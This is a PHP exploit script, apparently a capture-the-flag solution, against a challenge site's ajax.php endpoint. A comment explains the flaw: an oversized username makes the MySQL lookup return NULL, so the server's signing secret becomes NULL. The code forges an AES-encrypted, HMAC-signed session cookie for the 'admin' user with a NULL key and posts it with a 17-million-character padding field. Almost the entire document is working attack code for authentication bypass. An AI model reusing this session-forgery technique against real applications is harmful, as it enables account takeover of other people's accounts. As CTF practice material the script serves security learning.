<?php
/*
by default mysql query size is ~16mb
post_max_size=32M

it will make $sql = mysqli_query($con,"SELECT * FROM tab WHERE user='".mysqli_real_escape_string($con,$User)."' ") ; returns NULL!=0
and so $AuthKey=getAUTHkey($User); will return NULL as well
so you can forge now the session for any user since hmac secret will be resolved to NULL server side

*/

function bake_cookie($user){
	$AUTH_SECRET=NULL;
	$encrypted=encrypt_msg($user['user']."|".$user['password'],$AUTH_SECRET);
	$hmac=hmac_sign($encrypted,$AUTH_SECRET);
	return base64_encode($hmac."-".$encrypted);
}
function encrypt_msg( $plain,$key ) {
	$cipher="AES-256-ECB";
	$ivlen = openssl_cipher_iv_length($cipher);
	$iv = openssl_random_pseudo_bytes($ivlen);
	$encrypted = openssl_encrypt($plain, $cipher, $key, $options=0, $iv);
	return trim( base64_encode( $encrypted ) );
}
function hmac_sign($message, $key)	{
	return hash_hmac('sha256', $message, $key);
}

$postdata = http_build_query(
	array(
		'Auth' => bake_cookie(array("user"=>"admin","password"=>'foo')),
		'User' => str_repeat('A', 17000000)
	)
);
$opts = array('http' =>
	array(
		'method'  => 'POST',
		'header'  => 'Content-Type: application/x-www-form-urlencoded',
		'content' => $postdata
	)
);
$context  = stream_context_create($opts);

var_dump( file_get_contents('http://glitch.3k.ctf.to/ajax.php', false, $context) );